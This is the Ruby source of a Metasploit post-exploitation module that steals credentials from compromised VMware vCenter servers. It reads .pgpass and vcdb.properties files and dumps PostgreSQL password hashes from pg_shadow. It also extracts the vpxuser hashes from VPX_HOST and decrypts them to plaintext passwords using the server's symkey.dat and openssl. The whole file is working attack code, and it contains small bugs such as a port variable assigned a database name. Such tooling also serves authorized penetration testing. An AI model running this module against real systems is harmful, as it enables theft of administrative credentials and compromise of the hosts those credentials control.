##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Vcenter

  def initialize(_info = {})
    super(
      'Name' => 'VMware vCenter Postgres Credentials Stealer for Linux',
      'Description' => %q{
          This module gathers PostgreSQL passwords and hashes from VMware vCenter servers running on Linux.
        },
      'License' => MSF_LICENSE,
      'Platform' => ['linux', 'unix'],
      'SessionTypes' => ['meterpreter', 'shell'],
      'Author' => [
        'Erik Wynter', # @wyntererik
      ],
      'Actions' => [
        [ 'HASHDUMP', { 'Description' => 'Dump the PostgreSQL usernames and password hashes' } ],
        [ 'CUSTOM_QUERY', { 'Description' => 'Run a custom PostgreSQL query against the embedded database' } ],
        [ 'VPXUSER_HASHDUMP', { 'Description' => 'Dump the password hashes for the vpxuser from the VCDB. If you have root privielges, the module will try to decrypt the hashes.' } ],
        [ 'VPXV_VMS', { 'Description' => 'Print information about virtual machines located on the server' } ],
      ],
      'DefaultAction' => 'HASHDUMP',
    )
    register_options [
      OptBool.new('DISPLAY_RESULTS', [false, 'Display the results to the screen in addition to storing them in the loot directory', true]),
      OptString.new('QUERY', [false, 'Query to run when using the "CUSTOM_QUERY" action.', 'SELECT version();']),
      OptString.new('QUERY_DB', [false, 'Name of the database to connect to when using the "CUSTOM_QUERY" action.', 'VCDB']),
      OptString.new('PSQL_PATH', [false, 'Path to the vpostgres psql binary', '']),
    ]
  end

  def pgpass
    '/root/.pgpass'
  end

  def display_results
    datastore['DISPLAY_RESULTS']
  end

  def query
    datastore['QUERY']
  end

  def query_db
    datastore['QUERY_DB']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def psql_path
    datastore['PSQL_PATH']
  end

  def vpostgres_vmware_dir
    '/opt/vmware/vpostgres'
  end

  def symkey_path
    '/etc/vmware-vpx/ssl/symkey.dat'
  end

  def load_file(fname)
    begin
      data = read_file(fname)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to retrieve file. #{e.message}")
      data = ''
    end
    data
  end

  def grab_db_creds
    if is_root?
      res_code, res_contents = grab_db_creds_from_file('postgres', pgpass)
      case res_code
      when 0 # try to parse the file
        return parse_pgpass(res_contents, query_db)
      when 1 # give up
        return [res_code, res_contents]
      when 2 # try to get the VC user creds from /etc/vmware-vpx/vcdb.properties
        print_warning(res_contents)
      end
    end

    res_code = 0
    res_contents =
      res_code, res_contents = grab_db_creds_from_file('vc', vcdb_properties)
    if res_code == 1
      return [res_code, res_contents]
    end

    parse_vcdb_properties(res_contents)
  end

  def grab_db_creds_from_file(username, creds_file)
    print_status("Trying to retrieve the #{username} DB credentials from #{creds_file}")
    success = false
    if file_exist?(creds_file)
      file_contents = load_file(creds_file)
      if file_contents.blank?
        error_message = "Cannot connect to the DB as the #{username} user: #{creds_file} is empty or could not be read."
      else
        success = true
        # let's save the contents
        if creds_file == pgpass
          filename = 'pgpass'
        else
          filename = 'vcdb_properties'
        end
        path = store_loot(filename, 'text/plain', session, file_contents, "vcenter_#{filename}.txt")
        print_good("Saving the #{creds_file} contents to #{path}")
      end
    else
      error_message = "Cannot connect to the DB as the #{username} user: #{creds_file} does not exist."
    end

    if success
      return [0, file_contents]
    end

    # if we were tryging to read the pgpass file but we don't necessarily need root (since the action is not HASHDUMP), we should try to get vc user pass from vcdb_properties
    if creds_file == pgpass && action.name != 'HASHDUMP'
      error_code = 2
    else
      error_code = 1
    end

    [error_code, error_message]
  end

  def parse_pgpass(contents, db)
    contents.split("\n").each do |line|
      # example of pgpass line format: localhost:5432:VCDB:postgres:mypassword
      pghost, pgport, pgdb, pguser, pgpass = line.split(':')
      next if [pghost, pgport, pgdb, pguser, pgpass].any? { |i| i.blank? }
      # ignore the creds for the replication db since these can't be used
      next if pgdb == 'replication'

      # we want to save only one configuration per database, since by default they all work
      # we don't actually need the password since the server will read this from the .pgpass file
      if db == pgdb
        return [0, [pghost, pgport, pguser]]
      end
    end
    [1, "Failed to obtain credentials for the #{query_db} databse from the #{pgpass} file."]
  end

  def parse_vcdb_properties(contents)
    pghost = nil
    pgport = nil
    pgdb = nil
    pguser = nil
    pgpass = nil
    contents.split("\n").each do |line|
      case line
      when /^url = /
        pghost, pgport, pgdb = line.scan(%r{postgresql://(.*?):(.*?)/(.*?)$})&.flatten
        if pghost.nil? || pghost.empty?
          print_warning("Failed to obtain the postgresql hostname from #{vcdb_properties}. Using the default 'localhost', though this may not work.")
          pghost = 'localhost'
        end
        if pgport.nil? || pgport.empty?
          print_warning("Failed to obtain the postgresql port from #{vcdb_properties}. Using the default '5432', though this may not work.")
          pgport = '5432'
        end
        if pgdb.nil? || pgdb.empty?
          print_warning("Failed to obtain the postgresql database from #{vcdb_properties}. Using the default 'VCDB', though this may not work.")
          pgport = 'VCDB'
        end
      when /^username = /
        pguser = line.split('username = ')[1]
        if pguser.nil? || pguser.empty?
          print_warning("Failed to obtain the postgresql username from #{vcdb_properties}. Using the default 'vc', though this may not work.")
          pguser = 'vc'
        end
      when /^password = /
        pgpass = line.split('password = ')[1]
      when /^password.encrypted = /
        if !line.end_with?('false') # if password encryption is not off, we can't proceed
          return [1, "Failed to obtained database credentials from #{vcdb_properties} because the password appears to be encrypted."]
        end
      end
    end

    if pgpass.nil? || pgpass.empty?
      return [1, "Failed to obtained database credentials from #{vcdb_properties}."]
    end

    if pgdb != query_db
      print_warning("Failed to obtain credentials for the #{query_db}. Using credentials for the #{pgdb} database instead. This may not work.")
    end

    [0, [pghost, pgport, pguser, pgpass]]
  end

  def grab_query
    case action.name
    when 'HASHDUMP'
      return 'SELECT usename, passwd FROM pg_shadow;'
    when 'CUSTOM_QUERY'
      return query
    when 'VPXUSER_HASHDUMP'
      return 'SELECT user_name, password, local_ip_address, ip_address, dns_name FROM VPX_HOST;'
    when 'VPXV_VMS'
      return 'SELECT vmid, name, configfilename, guest_state, is_template FROM vpxv_vms;'
    end
  end

  def grab_bin
    unless psql_path.blank?
      unless file_exist?(psql_path)
        fail_with(Failure::NoTarget, "Cannot connect to the DB: The specified psql binary #{psql_path} does not exist")
      end
      return psql_path
    end

    unless directory?(vpostgres_vmware_dir)
      fail_with(Failure::NoTarget, 'Cannot connect to the DB: Did not find a psql binary to use')
    end

    # check if /opt/vmware/vpostgres/current/bin/ exists, since this is where the most recent version of psql should be stored
    if file_exist?("#{vpostgres_vmware_dir}/current/bin/psql")
      return "#{vpostgres_vmware_dir}/current/bin/psql"
    end

    # check for specific vpostgres version directories, i.e.  /opt/vmware/vpostgres/9.6/bin/
    vpostgres_vmware_dir_ls = cmd_exec("ls #{vpostgres_vmware_dir}")
    if vpostgres_vmware_dir_ls.blank?
      fail_with(Failure::NoTarget, 'Cannot connect to the DB: Did not find a psql binary to use')
    end

    # iteratre over the directories, and select the first that contains the binary we need, since the PostgreSQL version shouldn't matter
    vpostgres_vmware_dir_ls.split("\n").each do |d|
      bin_to_use = "#{vpostgres_vmware_dir}/#{d}/bin/psql"
      if file_exist?(bin_to_use)
        return bin_to_use
      end
    end

    fail_with(Failure::NoTarget, 'Cannot connect to the DB: Did not find a psql binary to use')
  end

  def perform_action(bin_name, db_config, cmd)
    pghost, pgport, pguser, pgpass = db_config
    if pgpass.nil?
      full_cmd = "export PGPASSFILE='/root/.pgpass'; #{bin_name} -h #{pghost} -p #{pgport} -d #{query_db} -U #{pguser} -w -c '#{cmd}'"
    else
      full_cmd = "export PGPASSWORD='#{pgpass}'; #{bin_name} -h #{pghost} -p #{pgport} -d #{query_db} -U #{pguser} -w -c '#{cmd}'"
    end
    print_status("Running command: #{full_cmd}")
    process_result(cmd_exec(full_cmd))
  end

  def process_result(query_result)
    if query_result.blank?
      fail_with(Failure::Unknown, 'No data was obtained from the database.')
    end

    if query_result =~ /^ERROR:\s+/
      print_error("Received error message from the database:\n#{query_result}")
      return
    end

    if display_results
      print_status("Received query response:\n#{query_result}")
    end

    case action.name
    when 'CUSTOM_QUERY'
      loot_name = 'vcenter_query'
    when 'HASHDUMP'
      loot_name = 'vcenter_hashdump'
    when 'VPXUSER_HASHDUMP'
      loot_name = 'vcenter_vpxdump'
    when 'VPXV_VMS'
      loot_name = 'vcenter_vpxv_vms'
    end
    path = store_loot(loot_name, 'text/plain', session, query_result, "#{loot_name}.txt")
    print_good("Saving #{action.name} result to #{path}")

    query_result
  end

  def get_symkey
    print_status("Attempting to obtain the symkey that can be used to decrypt the vpxuser hashes from #{symkey_path}")
    unless file_exist?(symkey_path)
      print_error("Cannot find #{symkey_path} on the target.")
      return 1
    end

    load_file(symkey_path).strip
  end

  def obtain_secretb64_and_vi(vpxuser_hash)
    secret_bytes = Base64.decode64(vpxuser_hash).bytes
    iv = secret_bytes[0..15].pack('c*').unpack('H*').first
    secret_b64 = Base64.strict_encode64(secret_bytes[16..63].pack('c*'))
    [iv, secret_b64]
  end

  def decrypt_vpxuser_passwords(query_result, symkey)
    query_lines = query_result.split("\n")
    max_pwd_length = 32 # default password length
    # check if actually received any results. We should have at least 4 lines, since the first two lines contain the table headers, and the last one the number of rows
    return 1 unless query_lines.length >= 4

    vpxuser_results = []
    cred_lines = query_result.split("\n")[2..-2]
    print_status("Attempting to crack the #{cred_lines.length} vpxuser passwords we have obtained.")
    cred_lines.each do |cline|
      username, vpxuser_hash_raw, local_ip, remote_ip, dns_name = cline.split(/\s+\|\s+/)
      username = username&.strip
      vpxuser_hash = vpxuser_hash_raw&.delete_suffix('*')
      # we need values for all 4 variables for the creds to be useable
      next if [username, vpxuser_hash, local_ip, remote_ip, dns_name].any? { |i| i.nil? || i.empty? }

      if remote_ip == dns_name
        remote_ip_dns = remote_ip
      else
        remote_ip_dns = "#{remote_ip} (#{dns_name})"
      end

      print_status("Attempting to decrypt the #{username} hash for the remote host #{remote_ip_dns}")
      iv, secret_b64 = obtain_secretb64_and_vi(vpxuser_hash)
      vprint_status("Obtained Initialization Vector (IV): #{iv} and the secret #{secret_b64}")
      openssl_cmd = %(echo '#{secret_b64}' | openssl enc -aes-256-cbc -A -a -d -K #{symkey} -iv #{iv})
      print_status("Using the following command: #{openssl_cmd}")
      password = cmd_exec(openssl_cmd)
      if password.include?('bad decrypt')
        print_error("Decryption failed for the #{username} credentials on remote host #{remote_ip_dns}")
        next
      end

      # default password length is 32
      if password.length != 32
        max_pwd_length = password.length if password.length > max_pwd_length
        vprint_warning('Password length does not equal the default of 32. This could mean something went wrong.')
      end

      print_good("Password decrypted! Remote host:#{remote_ip_dns} - Username:#{username} - Password:#{password}")
      # replace the hash with the password and save the new line so we can save a new table later
      new_cline = cline.gsub(vpxuser_hash_raw, password)
      vpxuser_results << new_cline
    end

    if vpxuser_results.empty?
      print_error('Failed to obtain any plaintext credentials.')
      return 1
    end

    # adjust the table header to the max password length
    table_column_names, table_header_border = query_lines[0..1]
    new_table_column_names_arr = table_column_names.split('|')
    new_password_header = ' ' * ((max_pwd_length - 8) / 2) + 'password'
    new_password_header += ' ' * (max_pwd_length + 2 - new_password_header.length)
    new_table_column_names_arr[1] = new_password_header
    new_table_column_names = new_table_column_names_arr.join('|')

    new_password_header_border = '-' * (max_pwd_length + 2)
    new_table_header_border_arr = table_header_border.split('+')
    new_table_header_border_arr[1] = new_password_header_border
    new_table_header_border = new_table_header_border_arr.join('+')
    vpxuser_results.unshift(new_table_header_border)
    vpxuser_results.unshift(new_table_column_names)

    print_good("Obtained #{vpxuser_results.length - 2} plaintext passwords:")
    puts vpxuser_results.join("\n")

    # save the results
    filename = 'vpxuser_pwds'
    path = store_loot(filename, 'text/plain', session, vpxuser_results.join("\n") + "\n", "vcenter_#{filename}.txt")
    print_status("Saving the results to #{path}")
  end

  def run
    unless is_root?
      if action.name == 'HASHDUMP'
        fail_with(Failure::NoAccess, 'The HASHDUMP action requires root privileges!')
      end

      print_warning('Not running as root, some actions may not work!')
    end

    if action.name == 'VPXUSER_HASHDUMP' && query_db != 'VCDB'
      fail_with(Failure::BadConfig, 'The VPXUSER_HASHDUMP action is only compatible with the VCDB database. You can change the database to query via the QUERY_DB option.')
    end

    # check the OS name to see if are likely dealing with vCenter
    if session.type == 'meterpreter'
      os_name = sysinfo['OS']
    else
      os_name = cmd_exec('grep -w NAME= /etc/os-release | cut -d "=" -f 2-')
    end
    unless os_name && os_name.include?('VMware Photon')
      fail_with(Failure::NoTarget, 'Target is not a VMware vCenter Server.')
    end

    if action.name == 'CUSTOM_QUERY' && query.blank?
      fail_with(Failure::BadConfig, 'Please specify a query to run when using the "CUSTOM_QUERY" action.')
    end

    res_code, db_config_or_error_msg = grab_db_creds
    if res_code == 1
      fail_with(Failure::NoTarget, db_config_or_error_msg)
    end

    # identify the binary to use for connecting to the database
    vprint_status('Locating the psql binary...')
    bin_to_use = grab_bin
    vprint_status("Found psql binary at #{bin_to_use}")

    query_result = perform_action(bin_to_use, db_config_or_error_msg, grab_query)
    # if we obtained the VPXUSER passwords, let's see if we have the privileges to decrypt them
    if action.name == 'VPXUSER_HASHDUMP' && is_root?
      symkey = get_symkey
      unless symkey == 1
        print_good("Obtained the following symkey: #{symkey}")
        decrypt_vpxuser_passwords(query_result, symkey)
      end
    end
  end
end
